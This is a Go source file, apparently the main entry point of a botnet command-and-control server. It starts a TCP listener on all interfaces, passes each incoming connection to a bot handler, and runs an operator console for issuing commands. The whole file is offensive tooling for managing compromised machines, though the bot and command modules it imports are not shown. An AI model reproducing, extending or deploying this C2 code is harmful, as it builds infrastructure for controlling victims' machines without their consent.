package main

import (
	"fmt"
	"net"
	"os"

	"c2/bot"
	"c2/cli"
	"c2/config"
)

func main() {
	// Initialize configuration
	config.Init()

	// Display startup banner
	cli.ShowBanner()

	// Start C2 server listener
	go startC2Server()

	// Handle user command input
	cli.HandleUserInput()
}

func startC2Server() {
	listener, err := net.Listen("tcp", config.ServerPort)
	if err != nil {
		fmt.Println("C2 server startup failed:", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Printf("\n[+] C2 server listening on 0.0.0.0%s\n", config.ServerPort)
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Connection error:", err)
			continue
		}
		go bot.HandleNewBot(conn)
	}
}
